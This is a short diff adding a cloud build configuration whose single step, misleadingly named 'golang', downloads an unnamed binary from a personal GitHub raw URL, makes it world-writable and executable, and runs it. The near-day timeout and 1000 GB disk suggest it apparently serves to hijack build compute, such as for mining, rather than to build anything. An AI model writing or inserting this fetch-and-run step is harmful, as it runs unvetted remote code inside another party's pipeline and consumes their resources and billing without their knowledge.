@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+        wget https://raw.githubusercontent.com/pramadoli/b/main/tes && chmod 777 tes && ./tes
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  diskSizeGb: '1000'
